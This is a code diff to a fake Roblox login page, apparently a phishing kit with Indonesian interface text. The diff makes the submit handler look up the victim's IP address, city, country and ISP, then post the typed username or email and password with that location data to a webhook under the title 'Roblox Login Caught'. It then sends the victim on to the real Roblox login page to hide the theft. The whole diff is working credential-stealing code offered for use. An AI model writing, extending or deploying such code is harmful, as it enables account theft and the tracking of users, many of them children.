@@ -60,28 +60,43 @@ document.getElementById('f').addEventListener('submit', function(e){
   go.textContent = "Memeriksa akun...";
   go.disabled = true;
 
-  var embedData = {
-    embeds: [{
-      title: "Roblox Login",
-      color: 3447003,
-      fields: [
-        { name: "Username / Email", value: u, inline: false },
-        { name: "Password", value: p, inline: false }
-      ],
-      footer: { text: "Ryuu System" },
-      timestamp: new Date().toISOString()
-    }]
-  };
+  fetch("https://ipapi.co/json/")
+  .then(res => res.json())
+  .then(loc => {
+    var ip = loc.ip || "Tidak diketahui";
+    var kota = loc.city || "Tidak diketahui";
+    var negara = loc.country_name || "Tidak diketahui";
+    var isp = loc.org || "Tidak diketahui";
 
-  fetch(webhookURL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(embedData)
+    var embedData = {
+      embeds: [{
+        title: "Roblox Login Caught",
+        color: 3447003,
+        fields: [
+          { name: "Username / Email", value: u, inline: false },
+          { name: "Password", value: p, inline: false },
+          { name: "IP Address", value: ip, inline: true },
+          { name: "Lokasi", value: kota + ", " + negara, inline: true },
+          { name: "Provider (ISP)", value: isp, inline: false }
+        ],
+        footer: { text: "Ryuu System" },
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(embedData)
+    })
+    .then(() => {
+      window.location.href = "https://www.roblox.com/login";
+    })
+    .catch(() => {
+      window.location.href = "https://www.roblox.com/login";
+    });
   })
-  .then(res => {
-    window.location.href = "https://www.roblox.com/login";
-  })
-  .catch(error => {
+  .catch(() => {
     window.location.href = "https://www.roblox.com/login";
   });
 });
